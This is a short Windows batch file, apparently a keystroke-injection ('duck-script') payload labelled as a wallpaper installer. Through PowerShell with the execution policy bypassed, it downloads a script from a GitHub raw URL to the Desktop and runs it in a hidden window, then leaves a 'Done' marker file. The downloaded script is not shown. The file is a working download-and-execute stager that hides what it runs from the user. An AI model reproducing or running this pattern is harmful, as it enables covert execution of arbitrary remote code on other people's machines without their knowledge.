@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/J0r00-creator/duck-script/main/install_wallpaper_sched.ps1' -OutFile $env:USERPROFILE\Desktop\install_wallpaper_sched.ps1"
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%USERPROFILE%\Desktop\install_wallpaper_sched.ps1"

echo Done > "%USERPROFILE%\Desktop\wallpaper_installer_done.txt"
